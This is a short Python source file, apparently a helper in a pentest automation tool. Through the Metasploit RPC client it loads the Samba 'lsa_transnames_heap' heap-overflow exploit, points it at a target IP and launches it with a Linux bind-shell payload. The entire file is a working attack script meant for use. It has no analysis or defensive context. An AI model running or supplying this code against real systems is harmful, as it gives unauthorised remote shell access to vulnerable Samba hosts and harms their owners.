from metasploit.msfrpc import MsfRpcClient


def samba_heap_exploit(client:MsfRpcClient, target:str):
    exploit = client.modules.use('exploit', 'linux/samba/lsa_transnames_heap')

    exploit['RHOST'] = target # IP of target host

    exploit.execute(payload='linux/x86/shell_bind_tcp')

    return


